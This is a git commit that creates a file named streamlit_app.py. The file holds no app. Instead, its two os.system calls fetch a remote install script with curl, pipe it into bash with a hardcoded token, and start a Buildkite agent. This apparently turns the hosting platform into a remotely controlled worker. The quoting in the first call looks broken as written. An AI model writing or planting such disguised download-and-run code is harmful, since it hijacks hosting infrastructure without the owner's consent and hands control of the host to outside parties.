170d2dc1c13ccb786eb57a5c949bdb1faa322234
rosieleec20 <127050205+rosieleec20@users.noreply.github.com>
2023-03-06 02:02:20 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,3 @@
+import os
+os.system("TOKEN="b36b82a368c69b262b5493dc034389cb8e3c5f42fda641ac6d" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`")
+os.system("~/.buildkite-agent/bin/buildkite-agent start")
